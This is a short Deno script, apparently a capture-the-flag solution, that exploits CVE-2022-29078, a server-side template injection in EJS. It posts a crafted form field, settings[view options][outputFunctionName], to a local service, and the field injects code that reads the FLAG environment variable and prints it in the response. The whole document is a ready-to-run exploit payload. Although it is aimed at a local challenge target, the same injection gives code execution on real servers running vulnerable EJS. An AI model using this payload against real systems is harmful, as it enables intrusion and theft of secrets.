#!/usr/bin/env -S deno run --allow-net=localhost:3000

// It's just CVE-2022-29078

fetch('http://localhost:3000', {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: 'breed=mallard&settings[view options][outputFunctionName]=x;__append(Deno.env.get("FLAG"));x'
}).then(res => res.text()).then(body => console.log(body.split('<')[0]))
